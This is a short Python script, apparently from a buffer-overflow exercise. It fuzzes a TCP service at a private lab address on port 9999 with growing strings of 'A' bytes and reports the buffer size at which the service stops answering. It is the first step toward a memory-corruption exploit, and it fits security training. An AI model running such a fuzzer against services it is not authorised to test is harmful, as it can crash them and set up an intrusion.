import socket
import time
import sys

target = "192.168.2.15"

port = 9999

timeout = 4

buffer = b"A" * 100

while True:
    try:
        print("Fuzzing With {} Bytes".format(len(buffer)))
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target,port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
        s.close()
    except:
        print("[!] Error At {} Byte".format(len(buffer)))
        sys.exit(0)
    buffer += b"A" * 100
    time.sleep(1)
